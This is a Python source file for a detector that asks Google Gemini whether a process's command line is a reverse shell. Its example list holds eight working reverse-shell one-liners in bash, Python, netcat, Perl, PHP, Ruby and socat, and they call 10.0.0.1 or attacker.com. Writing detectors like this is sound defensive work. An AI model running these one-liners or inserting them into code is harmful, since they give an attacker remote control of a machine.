import google as genai
from typing import List, Optional
from pydantic import BaseModel, Field
import os
import json
import psutil

# Configure the Google Gemini API
API_KEY = os.environ.get("GEMINI_API_KEY")
if API_KEY:
    genai.configure(api_key=API_KEY)

# Define the schema for LLM response validation
class ShellAnalysisResult(BaseModel):
    is_reverse_shell: bool = Field(description="Whether the command looks like a reverse shell")
    confidence: float = Field(description="Confidence score between 0.0 and 1.0")
    reasoning: str = Field(description="Explanation for the decision")

# Expanded context for LLM analysis
REVERSE_SHELL_EXAMPLES = [
    "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "nc -e /bin/sh 10.0.0.1 4242",
    "rm -f /tmp/p; mknod /tmp/p p && nc attacker.com 4242 0/tmp/p",
    "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242"
]

BENIGN_EXAMPLES = [
    "python -c 'print(\"Hello World\")'",
    "nc -z localhost 80",
    "bash -c 'echo test'",
    "perl -e 'print \"test\\n\"'",
    "socat - TCP:localhost:80"
]

# Enhanced prompt template for the LLM
ANALYSIS_PROMPT = """
You are a cybersecurity expert analyzing command line arguments to determine if they represent a reverse shell.

### Command to analyze:
{cmdline}

### Context about reverse shells:
A reverse shell is a shell session established on a connection that is initiated from the target machine to a listening attacker machine, giving the attacker access to the target machine.

### Common indicators of reverse shells:
1. Network connections using tools like nc, netcat, ncat, socat with specific parameters
2. Bash or shell commands with input/output redirection (0>&1, 1>&2)
3. /dev/tcp or /dev/udp connections
4. One-liner Python, Perl, Ruby, PHP or other scripting languages that establish network connections
5. Use of common reverse shell ports (e.g., 4444, 4242, 9001, etc.)
6. Command structure showing socket creation, connection to remote IP, and execution of shell
7. Process substitution or input/output redirection to network sockets

### Examples of reverse shells:
{examples}

### Examples of benign commands that might look similar:
{benign_examples}

### Connection information:
{connection_info}

Analyze the command above and determine if it is a reverse shell. Consider both the command syntax and the context.

Provide your analysis in the following JSON format:
{{
  "is_reverse_shell": true/false,
  "confidence": 0.0-1.0,
  "reasoning": "Your detailed reasoning here"
}}
"""

def get_connection_info(pid: int) -> str:
    """Get network connection information for a process"""
    try:
        p = psutil.Process(pid)
        connections = []
        for conn in p.net_connections(kind="inet"):
            if conn.status == psutil.CONN_ESTABLISHED and conn.raddr:
                connections.append(f"- {conn.laddr.ip}:{conn.laddr.port} -> {conn.raddr.ip}:{conn.raddr.port} ({conn.status})")
        
        if connections:
            return "Process has the following network connections:\n" + "\n".join(connections)
        return "No active network connections found for this process."
    except Exception as e:
        return f"Could not retrieve connection information: {str(e)}"

def analyze_with_llm(cmdline: List[str], pid: Optional[int] = None) -> Optional[ShellAnalysisResult]:
    """
    Use Google Gemini to analyze if a command line represents a reverse shell.
    
    Args:
        cmdline: List of command line arguments
        pid: Process ID (optional) to provide connection context
        
    Returns:
        ShellAnalysisResult object or None if analysis failed
    """
    if not API_KEY:
        return None
        
    try:
        model = genai.GenerativeModel('gemini-1.5-pro')
        joined_cmd = " ".join(cmdline)
        
        # Get connection info if pid is provided
        connection_info = get_connection_info(pid) if pid else "No connection information available."
        
        # Format examples as a bulleted list
        examples_formatted = "\n".join([f"- `{ex}`" for ex in REVERSE_SHELL_EXAMPLES])
        benign_examples_formatted = "\n".join([f"- `{ex}`" for ex in BENIGN_EXAMPLES])
        
        prompt = ANALYSIS_PROMPT.format(
            cmdline=joined_cmd,
            examples=examples_formatted,
            benign_examples=benign_examples_formatted,
            connection_info=connection_info
        )
        
        response = model.generate_content(prompt)
        
        # Extract JSON from response
        result_text = response.text
        if "```json" in result_text:
            # Extract JSON from code block
            json_str = result_text.split("```json")[1].split("```")[0].strip()
        elif "```" in result_text:
            # Try any code block
            json_str = result_text.split("```")[1].split("```")[0].strip()
        else:
            # Try to find JSON directly
            json_str = result_text.strip()
            
        # Parse the response
        analysis_dict = json.loads(json_str)
        return ShellAnalysisResult(**analysis_dict)
        
    except Exception as e:
        print(f"LLM analysis error: {e}")
        return None

def is_reverse_shell_by_llm(cmdline: List[str], pid: Optional[int] = None) -> bool:
    """
    Determine if a command is a reverse shell using LLM analysis.
    
    Args:
        cmdline: List of command line arguments
        pid: Process ID (optional) to provide connection context
        
    Returns:
        True if the LLM identifies this as a reverse shell with high confidence,
        False otherwise
    """
    result = analyze_with_llm(cmdline, pid)
    return result and result.is_reverse_shell and result.confidence >= 0.7